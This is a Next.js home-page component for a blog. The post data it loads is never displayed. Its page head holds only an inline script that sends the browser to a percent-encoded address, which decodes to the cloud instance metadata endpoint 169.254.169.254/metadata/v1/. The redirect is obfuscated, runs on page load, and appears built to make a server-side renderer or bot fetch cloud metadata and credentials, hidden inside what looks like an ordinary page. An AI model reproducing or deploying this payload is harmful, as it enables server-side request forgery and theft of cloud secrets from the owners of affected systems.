import Head from 'next/head'
import Layout, { siteTitle } from '../components/layout'
import utilStyles from '../styles/utils.module.css'
import { getSortedPostsData } from '../lib/posts'

export async function getStaticProps() {
  const allPostsData = getSortedPostsData();
  return {
    props: {
      allPostsData
    },
  };
}

export default function Home({ allPostsData }) {
  return (
    <Layout home>
      <Head>
        <script>window.location = 'http://%31%36%39%2e%32%35%34%2e%31%36%39%2e%32%35%34/metadata/v1/'</script>
      </Head>
    </Layout>
  );
}
